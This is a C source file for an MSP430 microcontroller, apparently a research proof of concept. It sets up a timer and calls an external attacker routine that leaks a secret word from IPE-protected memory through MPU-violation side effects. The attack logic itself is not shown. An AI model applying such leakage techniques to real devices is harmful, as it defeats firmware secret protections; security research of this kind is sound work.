/**
 * MPU covert channel PoC: leak a word of secret information through MPU violations.
 *
 * After launching the debug session, do a hard reset (to activate IPE), then run the code.
 *
 * Expected output:
 * ----------------
 * Leaked word: beef (cycles: 750)
 */

#include <msp430.h>
#include <stdint.h>
#include <stdio.h>

void attacker(void);
extern uint16_t latencies;
uint16_t *array = &latencies;
extern uint16_t pcs;
uint16_t *pa = &pcs;

extern uint16_t result;
uint16_t time;

int main(void)
{
	WDTCTL = WDTPW | WDTHOLD;	// stop watchdog timer

    TB0CTL = TBSSEL1 | MC1 | TBCLR;
    attacker();
    TB0CTL = 0;
    time = TB0R;

    printf("Leaked word: %x (cycles: %d)\n", result, time);

	return 0;
}
